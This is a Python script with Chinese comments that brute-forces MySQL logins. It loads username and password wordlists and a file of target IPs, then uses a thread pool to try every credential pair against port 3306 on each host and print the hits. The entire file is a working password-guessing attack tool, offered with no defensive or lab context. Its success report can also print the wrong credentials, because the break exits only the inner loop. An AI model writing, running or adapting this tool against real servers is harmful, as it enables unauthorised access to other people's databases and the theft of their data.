# -*- coding:utf-8 -*-
import pymysql,os,threadpool
def getUserpass():
	# 从TXT中获取用户名密码
	usernameList = []
	passwordList = []
	userList=open('mysql_user.txt','r')
	while True:
		line=userList.readline()
		if len(line.strip()) == 0:
			break
		usernameList.append(line.strip())
	userList.close()
	pwdList=open('mysql_pwd.txt','r')
	while True:
		line=pwdList.readline()
		if len(line.strip()) == 0:
			break
		passwordList.append(line.strip())
	pwdList.close()
	return usernameList,passwordList
def getIp():
	mysqlipList = []
	ipList=open('ip_range.txt','r')
	while True:
		line=ipList.readline()
		if len(line.strip()) == 0:
			break
		mysqlipList.append(line.strip())
	ipList.close()
	return mysqlipList
def connectMysql(mysqlIp,mysqlUser,mysqlPwd):
	# 链接数据库判断是否连接成功
	try:
		mysqlConn = pymysql.connect(host = mysqlIp, port = 3306, user = mysqlUser, passwd = mysqlPwd)
		pass
	except Exception as e:
		# print("%s : %s" %(mysqlPwd,e))
		return False
	else:
		return True
def crackMysql(mysqlIP):
	successFlag = 0
	userList,pwdList = getUserpass()
	for user in userList:
		for pwd in pwdList:
			if (connectMysql(mysqlIP, user, pwd)):
				successFlag = 1
				break
			else:
				pass
	if (successFlag == 1):
		print("爆破成功,ip:%s 用户名:%s 密码: %s" %(mysqlIP,user,pwd))
	else:
		print("爆破失败,ip:%s" %mysqlIP)
def main():
	# 主程序
	pool = threadpool.ThreadPool(5)
	mysqlipList = getIp()
	for th in threadpool.makeRequests(crackMysql, mysqlipList):
	    pool.putRequest(th)
	pool.wait()
if __name__ == "__main__":
	# 入口
	main()